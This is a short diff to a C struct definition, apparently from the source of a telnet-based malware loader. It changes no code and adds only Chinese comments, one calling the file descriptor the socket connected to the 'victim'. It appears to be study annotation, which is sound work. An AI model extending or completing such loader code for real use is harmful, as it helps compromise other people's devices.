@@ -7,10 +7,10 @@
 
 struct connection {
     pthread_mutex_t lock;
-    struct server *srv;
+    struct server *srv; //指回server结构体
     struct binary *bin;
-    struct telnet_info info;
-    int fd, echo_load_pos;
+    struct telnet_info info;    
+    int fd, echo_load_pos;  //fd：和victim连接的本地socket
     time_t last_recv;
     enum {
         TELNET_CLOSED,          // 0
